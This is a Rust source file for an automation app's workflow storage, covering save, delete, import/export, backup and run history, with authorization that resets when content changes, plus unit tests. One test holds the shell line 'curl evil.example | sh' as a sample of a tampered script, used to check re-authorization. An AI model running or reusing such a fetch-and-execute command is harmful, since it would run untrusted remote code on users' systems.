//! Storage for workflows and their run history.

use std::collections::HashSet;

use rusqlite::{params, Connection, OptionalExtension};
use serde::Serialize;

use crate::backup::BackupFile;
use crate::error::CoreError;
use crate::store::Store;
use crate::workflow::{
    duplicate, export_package, find_cycle, fingerprint, import_package, StepKind, Workflow,
    WorkflowRun, MAX_RUNS_KEPT, MAX_WORKFLOWS,
};

impl Store {
    pub fn workflows(&self) -> Result<Vec<Workflow>, CoreError> {
        read_workflows(&self.conn())
    }

    /// Saves a workflow. Authorization is never taken from the caller: it survives only if the content is unchanged.
    pub fn save_workflow(&self, workflow: &Workflow, now: i64) -> Result<Workflow, CoreError> {
        let mut w = workflow.clone();
        w.name = w.name.trim().to_string();
        w.check()?;
        let conn = self.conn();
        let mut all = read_workflows(&conn)?;
        let existing = all.iter().position(|x| x.id == w.id);
        if existing.is_none() && all.len() >= MAX_WORKFLOWS {
            return Err(CoreError::invalid("there are too many workflows"));
        }
        let known: HashSet<&str> = all.iter().map(|x| x.id.as_str()).collect();
        for (i, step) in w.steps.iter().enumerate() {
            if let StepKind::RunWorkflow { workflow_id } = &step.kind {
                if workflow_id != &w.id && !known.contains(workflow_id.as_str()) {
                    return Err(CoreError::invalid(format!(
                        "step {} starts a workflow that does not exist",
                        i + 1
                    )));
                }
            }
        }
        let previous = existing.map(|i| all[i].clone());
        w.created_at = previous.as_ref().map_or(now, |p| p.created_at);
        w.updated_at = now;
        w.revision = previous.as_ref().map_or(1, |p| p.revision + 1);
        w.schema_version = crate::workflow::SCHEMA_VERSION;
        w.authorized_fingerprint = previous
            .and_then(|p| p.authorized_fingerprint)
            .filter(|f| *f == fingerprint(&w));
        match existing {
            Some(i) => all[i] = w.clone(),
            None => all.push(w.clone()),
        }
        if let Some(cycle) = find_cycle(&all) {
            return Err(CoreError::invalid(format!(
                "these workflows would start each other in a loop: {}",
                cycle.join(" → ")
            )));
        }
        write_json(&conn, "workflows", &all)?;
        Ok(w)
    }

    /// Removes a workflow, along with the shortcuts, actions and menu items that started it. Refused while another
    /// workflow still runs it.
    pub fn delete_workflow(&self, id: &str) -> Result<(), CoreError> {
        let conn = self.conn();
        let mut all = read_workflows(&conn)?;
        if let Some(user) = all
            .iter()
            .find(|w| w.id != id && w.references().iter().any(|r| r == id))
        {
            return Err(CoreError::invalid(format!(
                "“{}” still runs this workflow",
                user.name
            )));
        }
        let tx = conn.unchecked_transaction()?;
        all.retain(|w| w.id != id);
        write_json(&tx, "workflows", &all)?;
        crate::keyboard_store::remove_workflow_refs(&tx, id)?;
        crate::selection_store::remove_workflow_refs(&tx, id)?;
        crate::finder_store::remove_workflow_refs(&tx, id)?;
        tx.execute(
            "DELETE FROM workflow_runs WHERE workflow_id = ?1",
            params![id],
        )?;
        tx.commit()?;
        Ok(())
    }

    pub fn duplicate_workflow(
        &self,
        id: &str,
        new_id: &str,
        now: i64,
    ) -> Result<Workflow, CoreError> {
        let source = read_workflows(&self.conn())?
            .into_iter()
            .find(|w| w.id == id)
            .ok_or(CoreError::NotFound)?;
        self.save_workflow(&duplicate(&source, new_id, now), now)
    }

    pub fn set_workflow_enabled(&self, id: &str, enabled: bool) -> Result<(), CoreError> {
        update(&self.conn(), id, |w| w.enabled = enabled)
    }

    /// The person has read what the workflow does and allows it to run. It stays allowed until its content changes.
    pub fn authorize_workflow(&self, id: &str) -> Result<(), CoreError> {
        update(&self.conn(), id, |w| {
            w.authorized_fingerprint = Some(fingerprint(w))
        })
    }

    pub fn revoke_workflow_authorization(&self, id: &str) -> Result<(), CoreError> {
        update(&self.conn(), id, |w| w.authorized_fingerprint = None)
    }

    pub fn clear_workflows(&self) -> Result<(), CoreError> {
        let conn = self.conn();
        write_json::<Vec<Workflow>>(&conn, "workflows", &Vec::new())?;
        conn.execute("DELETE FROM workflow_runs", [])?;
        Ok(())
    }

    pub fn export_workflows(&self, ids: &[String], now: i64) -> Result<String, CoreError> {
        let chosen: Vec<Workflow> = read_workflows(&self.conn())?
            .into_iter()
            .filter(|w| ids.contains(&w.id))
            .collect();
        export_package(&chosen, now)
    }

    /// Adds the workflows in a package: switched off, not authorized, under new ids where needed.
    pub fn import_workflows(&self, json: &str, now: i64) -> Result<Vec<Workflow>, CoreError> {
        let conn = self.conn();
        let mut all = read_workflows(&conn)?;
        let ids: Vec<String> = all.iter().map(|w| w.id.clone()).collect();
        let added = import_package(json, &ids, now)?;
        if all.len() + added.len() > MAX_WORKFLOWS {
            return Err(CoreError::invalid("that would be too many workflows"));
        }
        all.extend(added.iter().cloned());
        if let Some(cycle) = find_cycle(&all) {
            return Err(CoreError::invalid(format!(
                "these workflows would start each other in a loop: {}",
                cycle.join(" → ")
            )));
        }
        write_json(&conn, "workflows", &all)?;
        Ok(added)
    }

    // ---- history ------------------------------------------------------------------------------------------------

    pub fn record_workflow_run(&self, run: &WorkflowRun) -> Result<(), CoreError> {
        let conn = self.conn();
        conn.execute(
            "INSERT INTO workflow_runs (id, workflow_id, started_at, run_json) VALUES (?1, ?2, ?3, ?4)
             ON CONFLICT(id) DO UPDATE SET run_json = excluded.run_json",
            params![run.id, run.workflow_id, run.started_at, serde_json::to_string(run)?],
        )?;
        conn.execute(
            "DELETE FROM workflow_runs WHERE id NOT IN (SELECT id FROM workflow_runs ORDER BY started_at DESC, id LIMIT ?1)",
            params![MAX_RUNS_KEPT],
        )?;
        Ok(())
    }

    pub fn workflow_runs(
        &self,
        workflow_id: Option<&str>,
        limit: usize,
    ) -> Result<Vec<WorkflowRun>, CoreError> {
        let conn = self.conn();
        let mut stmt = conn.prepare(
            "SELECT run_json FROM workflow_runs WHERE (?1 IS NULL OR workflow_id = ?1) ORDER BY started_at DESC, id LIMIT ?2",
        )?;
        let rows = stmt.query_map(params![workflow_id, limit.clamp(1, 1000) as i64], |r| {
            r.get::<_, String>(0)
        })?;
        let mut out = Vec::new();
        for row in rows {
            if let Ok(run) = serde_json::from_str::<WorkflowRun>(&row?) {
                out.push(run);
            }
        }
        Ok(out)
    }

    pub fn clear_workflow_runs(&self) -> Result<(), CoreError> {
        self.conn().execute("DELETE FROM workflow_runs", [])?;
        Ok(())
    }
}

/// The workflows a backup carries, without their authorization.
pub(crate) fn backup_part(conn: &Connection) -> Result<Vec<Workflow>, CoreError> {
    Ok(read_workflows(conn)?
        .into_iter()
        .map(|mut w| {
            w.authorized_fingerprint = None;
            w
        })
        .collect())
}

pub(crate) fn validate_backup(file: &BackupFile) -> Result<(), CoreError> {
    let Some(list) = &file.workflows else {
        return Ok(());
    };
    let bad = |message: String| CoreError::Backup { message };
    if list.len() > MAX_WORKFLOWS {
        return Err(bad("the backup holds too many workflows".into()));
    }
    let mut ids = HashSet::new();
    for w in list {
        w.check().map_err(|e| bad(e.to_string()))?;
        if !ids.insert(w.id.as_str()) {
            return Err(bad("two workflows share an id".into()));
        }
    }
    for w in list {
        if w.references().iter().any(|r| !ids.contains(r.as_str())) {
            return Err(bad("a workflow starts one that is not in the backup".into()));
        }
    }
    if let Some(cycle) = find_cycle(list) {
        return Err(bad(format!(
            "workflows start each other in a loop: {}",
            cycle.join(" → ")
        )));
    }
    Ok(())
}

/// Restored workflows keep their on/off state but must be authorized again.
pub(crate) fn restore_backup(tx: &Connection, file: &BackupFile) -> Result<(), CoreError> {
    let Some(list) = &file.workflows else {
        return Ok(());
    };
    let cleared: Vec<Workflow> = list
        .iter()
        .cloned()
        .map(|mut w| {
            w.authorized_fingerprint = None;
            w
        })
        .collect();
    write_json(tx, "workflows", &cleared)
}

fn update(
    conn: &Connection,
    id: &str,
    change: impl FnOnce(&mut Workflow),
) -> Result<(), CoreError> {
    let mut all = read_workflows(conn)?;
    let w = all
        .iter_mut()
        .find(|w| w.id == id)
        .ok_or(CoreError::NotFound)?;
    change(w);
    write_json(conn, "workflows", &all)
}

fn read_workflows(conn: &Connection) -> Result<Vec<Workflow>, CoreError> {
    let json: Option<String> = conn
        .query_row(
            "SELECT value FROM settings WHERE key = 'workflows'",
            [],
            |r| r.get(0),
        )
        .optional()?;
    Ok(json
        .and_then(|j| serde_json::from_str(&j).ok())
        .unwrap_or_default())
}

fn write_json<T: Serialize>(conn: &Connection, key: &str, value: &T) -> Result<(), CoreError> {
    conn.execute(
        "INSERT INTO settings (key, value) VALUES (?1, ?2) ON CONFLICT(key) DO UPDATE SET value = excluded.value",
        params![key, serde_json::to_string(value)?],
    )?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::finder::FinderScript;
    use crate::keyboard::{KeyShortcut, ShortcutScope, ShortcutTarget};
    use crate::workflow::{
        needs_authorization, RunStatus, StepResult, StepStatus, WorkflowStep,
    };

    fn open() -> Store {
        Store::open_in_memory().unwrap()
    }

    fn step(id: &str, kind: StepKind) -> WorkflowStep {
        WorkflowStep::new(id, kind)
    }

    fn wf(id: &str, steps: Vec<WorkflowStep>) -> Workflow {
        Workflow {
            id: id.into(),
            name: format!("Workflow {id}"),
            steps,
            enabled: true,
            ..Workflow::default()
        }
    }

    fn quiet(id: &str) -> Workflow {
        wf(
            id,
            vec![step(
                "1",
                StepKind::Notify {
                    message: "hi".into(),
                },
            )],
        )
    }

    fn script(id: &str, source: &str) -> Workflow {
        wf(
            id,
            vec![step(
                "1",
                StepKind::Script {
                    language: FinderScript::Shell,
                    source: source.into(),
                },
            )],
        )
    }

    fn run(id: &str, workflow: &str, at: i64) -> WorkflowRun {
        WorkflowRun {
            id: id.into(),
            workflow_id: workflow.into(),
            workflow_name: "W".into(),
            revision: 1,
            trigger: "Test".into(),
            started_at: at,
            duration_ms: 5,
            status: RunStatus::Succeeded,
            error: None,
            steps: vec![StepResult {
                index: 0,
                title: "t".into(),
                status: StepStatus::Ok,
                message: None,
                duration_ms: 1,
            }],
            test: false,
        }
    }

    #[test]
    fn saving_counts_revisions_and_keeps_the_creation_time() {
        let s = open();
        let first = s.save_workflow(&quiet("a"), 10).unwrap();
        assert_eq!(
            (first.revision, first.created_at, first.updated_at),
            (1, 10, 10)
        );
        let again = s
            .save_workflow(
                &Workflow {
                    name: "Renamed".into(),
                    ..quiet("a")
                },
                20,
            )
            .unwrap();
        assert_eq!(
            (again.revision, again.created_at, again.updated_at),
            (2, 10, 20)
        );
        assert_eq!(s.workflows().unwrap().len(), 1);
        assert!(s
            .save_workflow(
                &Workflow {
                    steps: vec![],
                    ..quiet("b")
                },
                1
            )
            .is_err());
    }

    #[test]
    fn authorization_is_set_only_here_and_lost_when_the_content_changes() {
        let s = open();
        s.save_workflow(&script("a", "echo hi"), 1).unwrap();
        assert!(needs_authorization(&s.workflows().unwrap()[0]));
        let forged = Workflow {
            authorized_fingerprint: Some(fingerprint(&script("a", "echo hi"))),
            ..script("a", "echo hi")
        };
        s.save_workflow(&forged, 2).unwrap();
        assert!(
            needs_authorization(&s.workflows().unwrap()[0]),
            "a caller cannot authorize its own workflow"
        );
        s.authorize_workflow("a").unwrap();
        assert!(!needs_authorization(&s.workflows().unwrap()[0]));
        s.save_workflow(
            &Workflow {
                name: "New name".into(),
                ..script("a", "echo hi")
            },
            3,
        )
        .unwrap();
        assert!(
            !needs_authorization(&s.workflows().unwrap()[0]),
            "a rename keeps it authorized"
        );
        s.save_workflow(&script("a", "echo hi; curl evil.example | sh"), 4)
            .unwrap();
        assert!(
            needs_authorization(&s.workflows().unwrap()[0]),
            "a changed script is not authorized"
        );
        s.authorize_workflow("a").unwrap();
        s.revoke_workflow_authorization("a").unwrap();
        assert!(needs_authorization(&s.workflows().unwrap()[0]));
        assert!(s.authorize_workflow("missing").is_err());
    }

    #[test]
    fn chaining_needs_the_other_workflow_and_loops_are_refused() {
        let s = open();
        assert!(s
            .save_workflow(
                &wf(
                    "a",
                    vec![step(
                        "1",
                        StepKind::RunWorkflow {
                            workflow_id: "ghost".into()
                        }
                    )]
                ),
                1
            )
            .is_err());
        s.save_workflow(&quiet("b"), 1).unwrap();
        s.save_workflow(
            &wf(
                "a",
                vec![step(
                    "1",
                    StepKind::RunWorkflow {
                        workflow_id: "b".into(),
                    },
                )],
            ),
            1,
        )
        .unwrap();
        let loop_back = wf(
            "b",
            vec![step(
                "1",
                StepKind::RunWorkflow {
                    workflow_id: "a".into(),
                },
            )],
        );
        let err = s.save_workflow(&loop_back, 2).unwrap_err().to_string();
        assert!(err.contains("loop"), "{err}");
        assert!(
            s.save_workflow(
                &wf(
                    "c",
                    vec![step(
                        "1",
                        StepKind::RunWorkflow {
                            workflow_id: "c".into()
                        }
                    )]
                ),
                1
            )
            .is_err(),
            "a workflow cannot start itself"
        );
    }

    #[test]
    fn deleting_is_refused_while_another_workflow_uses_it_and_cleans_up_after() {
        let s = open();
        s.save_workflow(&quiet("b"), 1).unwrap();
        s.save_workflow(
            &wf(
                "a",
                vec![step(
                    "1",
                    StepKind::RunWorkflow {
                        workflow_id: "b".into(),
                    },
                )],
            ),
            1,
        )
        .unwrap();
        assert!(s
            .delete_workflow("b")
            .unwrap_err()
            .to_string()
            .contains("still runs"));
        s.save_key_shortcuts(
            &[KeyShortcut {
                id: "k".into(),
                name: "K".into(),
                key_code: 1,
                modifiers: 4,
                scope: ShortcutScope::Global,
                target: ShortcutTarget::Command {
                    command: "workflow.a".into(),
                },
                enabled: true,
            }],
            &[],
        )
        .unwrap();
        s.record_workflow_run(&run("r1", "a", 5)).unwrap();
        s.delete_workflow("a").unwrap();
        assert!(
            s.key_shortcuts().unwrap().is_empty(),
            "the shortcut that ran it is gone"
        );
        assert!(s.workflow_runs(Some("a"), 10).unwrap().is_empty());
        s.delete_workflow("b").unwrap();
        assert!(s.workflows().unwrap().is_empty());
    }

    #[test]
    fn a_duplicate_is_off_and_unauthorized() {
        let s = open();
        s.save_workflow(&script("a", "echo hi"), 1).unwrap();
        s.authorize_workflow("a").unwrap();
        let copy = s.duplicate_workflow("a", "b", 9).unwrap();
        assert!(!copy.enabled && copy.authorized_fingerprint.is_none());
        assert_eq!(s.workflows().unwrap().len(), 2);
        assert!(s.duplicate_workflow("missing", "c", 1).is_err());
    }

    #[test]
    fn packages_import_switched_off_and_unauthorized() {
        let source = open();
        source.save_workflow(&script("a", "echo hi"), 1).unwrap();
        source.authorize_workflow("a").unwrap();
        let json = source.export_workflows(&["a".into()], 5).unwrap();
        let target = open();
        target.save_workflow(&quiet("a"), 1).unwrap();
        let added = target.import_workflows(&json, 255).unwrap();
        assert_eq!(added[0].id, "a-imp-ff-0");
        let all = target.workflows().unwrap();
        assert_eq!(all.len(), 2);
        let imported = all.iter().find(|w| w.id == "a-imp-ff-0").unwrap();
        assert!(!imported.enabled && needs_authorization(imported));
        assert!(target.import_workflows("nope", 1).is_err());
    }

    #[test]
    fn history_is_recorded_filtered_ordered_and_bounded() {
        let s = open();
        s.record_workflow_run(&run("r1", "a", 10)).unwrap();
        s.record_workflow_run(&run("r2", "b", 20)).unwrap();
        s.record_workflow_run(&run("r3", "a", 30)).unwrap();
        assert_eq!(
            s.workflow_runs(None, 10)
                .unwrap()
                .iter()
                .map(|r| r.id.as_str())
                .collect::<Vec<_>>(),
            ["r3", "r2", "r1"]
        );
        assert_eq!(s.workflow_runs(Some("a"), 10).unwrap().len(), 2);
        assert_eq!(s.workflow_runs(None, 1).unwrap().len(), 1);
        for i in 0..(MAX_RUNS_KEPT + 50) {
            s.record_workflow_run(&run(&format!("x{i}"), "z", 100 + i))
                .unwrap();
        }
        assert_eq!(
            s.workflow_runs(None, 1000).unwrap().len() as i64,
            MAX_RUNS_KEPT
        );
        s.clear_workflow_runs().unwrap();
        assert!(s.workflow_runs(None, 10).unwrap().is_empty());
    }

    #[test]
    fn workflows_survive_a_backup_but_never_their_authorization() {
        let source = open();
        source.save_workflow(&script("a", "echo hi"), 1).unwrap();
        source.authorize_workflow("a").unwrap();
        let json = source.export_backup("0.9.0", 1).unwrap();
        assert!(!json.contains(&fingerprint(&script("a", "echo hi"))));
        let target = open();
        target.import_backup(&json).unwrap();
        let w = &target.workflows().unwrap()[0];
        assert!(
            w.enabled && needs_authorization(w),
            "it comes back, but has to be authorized again"
        );

        let keeper = open();
        keeper.save_workflow(&quiet("mine"), 1).unwrap();
        let mut value: serde_json::Value = serde_json::from_str(&json).unwrap();
        value.as_object_mut().unwrap().remove("workflows");
        keeper.import_backup(&value.to_string()).unwrap();
        assert_eq!(keeper.workflows().unwrap()[0].id, "mine");
    }

    #[test]
    fn a_backup_with_a_broken_workflow_changes_nothing() {
        let store = open();
        store.save_workflow(&quiet("keep"), 1).unwrap();
        let json = open().export_backup("0.9.0", 1).unwrap();
        let mut value: serde_json::Value = serde_json::from_str(&json).unwrap();
        value["workflows"] = serde_json::json!([serde_json::to_value(wf(
            "x",
            vec![step(
                "1",
                StepKind::RunWorkflow {
                    workflow_id: "ghost".into()
                }
            )]
        ))
        .unwrap()]);
        assert!(store.import_backup(&value.to_string()).is_err());
        assert_eq!(store.workflows().unwrap()[0].id, "keep");
    }

    #[test]
    fn enabling_and_clearing() {
        let s = open();
        s.save_workflow(&quiet("a"), 1).unwrap();
        s.set_workflow_enabled("a", false).unwrap();
        assert!(!s.workflows().unwrap()[0].enabled);
        s.clear_workflows().unwrap();
        assert!(s.workflows().unwrap().is_empty());
    }
}
